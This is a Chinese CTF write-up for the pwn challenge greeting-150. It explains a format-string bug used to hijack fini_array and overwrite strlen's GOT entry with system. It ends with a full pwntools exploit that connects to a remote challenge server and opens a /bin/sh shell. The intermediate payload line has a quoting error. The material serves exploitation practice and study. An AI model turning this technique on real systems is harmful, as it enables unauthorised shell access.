# 攻防世界-greeting-150

`格式化字符串漏洞`+`fini_arry劫持`+`got表篡改`

# checksec

```shell
[*] '/home/giantbranch/Desktop/pwn/greeting/pwn'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf("Please tell me your name... ");
  if ( !getnline(&v5, 64) )
    return puts("Don't ignore me ;( ");
  sprintf(&s, "Nice to meet you, %s :)\n", &v5);
  return printf(&s);
}
```

这里明显有个format string exploit，我们再看看getnline中做了什么。

```c
size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
```

向v5中写入64字节的数据，最后返回字符串长度。

分析一下，我们只有一次输入的机会，而且程序开启了canary保护，所以普通的栈溢出失效。

想要控制程序的执行流可以通过`fini_arry`劫持到main函数。

`format string exploit`可以达到任意地址写的目的。getnline最后会调用strlen(s),而s的内容是我们可以控制的，再查看程序，发现plt表处有system函数，所以想到将strlen的got表覆盖为system的plt表。

控制程序回到main，输入“/bin/sh”，从而再调用strlen(s)时，相当于调用了system("/bin/sh")

查看程序各段：

```python
system_plt=0x08048490
main=0x080485ED
fini_arry=0x08049934
```

注意sprintf函数，是将Nice to meet you, %s :)写入s中的，而不是输出。所以偏移的计算应该加上strlen(Nice to meet you, )

初始payload如下：

```py
payload='aa'+p32(fini_arry+2)+p32(strlen_got+2)+p32(strlen_got)+p32(fini_arry)
payload+='%'+'offset1'+'c%12$hn'+'%13$hn'+'%'+'offset2'+c%14$hn'+'%'+'offset3'+c%15$hn'
```

这里多出来的aa是因为字节对齐（待深入），在找参数位置时候也能发现要多写两个字节。

```python
offset1=0x804-18-2-16=2016
offset2=0x8490-0x804=31884
offset3=0x85ED-0x8490=349
```

# EXP

```python
from pwn import *
context.log_level="DEBUG"
from ctypes import *

local=0
offset=2
if local:
	p=process('./pwn')
	elf = ELF('./pwn')
else:
	p=remote('220.249.52.133',46316)
	elf = ELF('./pwn')
strlen_got=elf.got['strlen']
system_plt=0x08048490
main=0x080485ED
fini_arry=0x08049934

payload='aa'+p32(fini_arry+2)+p32(strlen_got+2)+p32(strlen_got)+p32(fini_arry)
payload+='%2016c%12$hn'+'%13$hn'+'%31884c%14$hn'+'%349c%15$hn'
p.sendline(payload)

sleep(0.5)
p.sendline("/bin/sh")

p.interactive()
```

